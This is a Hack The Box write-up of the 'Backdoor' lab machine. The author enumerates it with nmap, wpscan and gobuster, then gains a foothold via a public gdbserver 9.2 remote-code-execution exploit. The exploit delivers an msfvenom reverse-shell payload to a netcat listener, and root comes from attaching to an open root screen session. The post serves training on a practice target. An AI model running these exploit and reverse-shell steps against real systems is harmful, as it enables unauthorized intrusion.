---
title: "Hack The Box - Backdoor Walkthrough"
date: 2022-03-29T14:19:37+02:00
description: "Hack the Box Backdoor walkthrough/write-up"
featured: false
draft: false
toc: false
# menu: main
usePageBundles: false
featureImage: "/images/backdoor_htb.png"
#featureImageAlt: 'Description of image'
#featureImageCap: 'This is the featured image.'
thumbnail: "/images/backdoor_htb.png"
shareImage: "/images/backdoor_htb.png"
codeMaxLines: 20
codeLineNumbers: false
figurePositionShow: true
categories:
  - Walkthroughs
tags:
  - Hack the Box
  - Linux
---
Welcome to my walkthrough for the "Backdoor" machine from Hack The Box. Backdoor is considered to be an easy box. We get a foothold onto the box through the exploitation of a vulnerable web service running at an unusual port. We can then escalate privileges through a screen session that was still open, which was running as the root user. 

## Foothold
Today I figured it would be nice to get some tea while the scans were running, so therefore I started the box off with an nmap scan on all ports. 

```sh
nmap -sC -sV -p- -oN nmap/all_ports backdoor.htb
```

Which provides us with three open ports, which are 22, 80 and 1337 (leet!)

```txt
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.8.1
|_http-title: Backdoor &#8211; Real-Life
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Right away we can see that we are dealing with a wordpress-based web service, and that port 1337 (l33t) is open. The box is named Backdoor.. Would port 1337 have something to do with that? We'll figure it out. Let's first focus on port 80. We start off with a wordpress scan on the background, and visit the page.

```sh
wpscan --url http://backdoor.htb/ --rua --enumerate ap
```

The wpscan doesn't give us much to work with, neither does looking at the page. Let's use gobuster to see if there are any interesting files/folders.

```sh
gobuster dir -u http://backdoor.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster.out -x php
```

Which finds the following URI's and files.

```text
/wp-content           (Status: 301) [Size: 317] [http://backdoor.htb/wp-content/]                                                                                                                                                      
/wp-admin             (Status: 301) [Size: 315] [http://backdoor.htb/wp-admin/]                                                                                                                                                        
/wp-includes          (Status: 301) [Size: 318] [http://backdoor.htb/wp-includes/]                                                                                                                                                     
/xmlrpc.php           (Status: 405) [Size: 42]                                                                                                                                                                                             
/index.php            (Status: 301) [Size: 0]            
/wp-trackback.php     (Status: 200) [Size: 135]                                        
/wp-login.php         (Status: 200) [Size: 5674]                                       
/server-status        (Status: 403) [Size: 277]                                        
/wp-config.php        (Status: 200) [Size: 0]
```

I tried enumerating the webservice through these results, but did not manage to find any interesting information. Therefore I decided to start looking into services running on port 1337. After a while I landed on a remote code execution vulnerability in GNU gdbserver 9.2 that I decided to check out. I download the exploit and follow the provided instructions.

```sh
# I download the exploit
searchsploit -m linux/remote/50539.py

# I create the reverse shell with the syntax provided by the exploit author
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.52 LPORT=9001 PrependFork=true -o rev.bin

# I set up a netcat listener
rlwrap nc -nvlp 9001

# I excute the script
┌──(kali㉿kali)-[~/Documents/htb/backdoor]
└─$ python3 50539.py backdoor.htb:1337 rev.bin                                                                   
[+] Connected to target. Preparing exploit
[+] Found x64 arch
[+] Sending payload
[*] Pwned!! Check your listener
```

After which I get a user shell, and manage to read the contents of the user.txt file. 

```txt
connect to [10.10.14.52] from (UNKNOWN) [10.129.96.68] 40000
whoami
user

python3 -c 'import pty;pty.spawn("/bin/bash")'

user@Backdoor:/home/user$ ls
user.txt
```

## Privilege Escalation
Now that we have our foothold, I download Linpeas to the box and run it. Linpeas quickly indicates the following line as a 95% PE vector:

```sh
root 948 0.0 0.0 2608 1752 ? Ss 12:18 0:02 _ 

/bin/sh -c while true;
do sleep 1;
find /var/run/screen/S-root/ -empty -exec screen -dmS root ;;
done
```

We see that there currently is a screen session running as root. Knowing this, we simply attach to the screen by using the -x switch. 

```sh
screen -x root/root

root@Backdoor:~# whoami
root

root@Backdoor:~# ls
root.txt
```

Well, the privilege escalation went a lot quicker than the enumeration phase. A good lesson to learn --> do not leave screen sessions open as the root user :)

Thanks for reading my walkthrough. Have a great day and see you at the next one!